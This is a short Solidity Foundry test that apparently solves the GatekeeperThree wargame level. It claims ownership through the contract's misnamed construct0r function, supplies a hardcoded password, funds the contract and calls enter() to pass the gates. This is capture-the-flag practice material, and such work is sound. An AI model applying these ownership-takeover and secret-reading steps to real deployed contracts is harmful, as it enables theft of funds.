// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {SimpleTrick, GatekeeperThree} from "../src/Gate.sol";

contract AttackTest is Test {
    SimpleTrick public traick;
    GatekeeperThree public gate;

    function setUp() public {
        gate = GatekeeperThree(payable(0x01c8a314A7f5764043B5bE7a8d5d55c4165638Ba));
    }

    function testAttack() public {
        gate.construct0r();
        uint password = 1706806620;
        gate.getAllowance(password);
        payable(address(gate)).transfer(0.002 ether);

        console.log(gate.entrant());

        gate.enter();

        console.log(gate.entrant());

        assertEq(tx.origin, gate.entrant());
    }
}
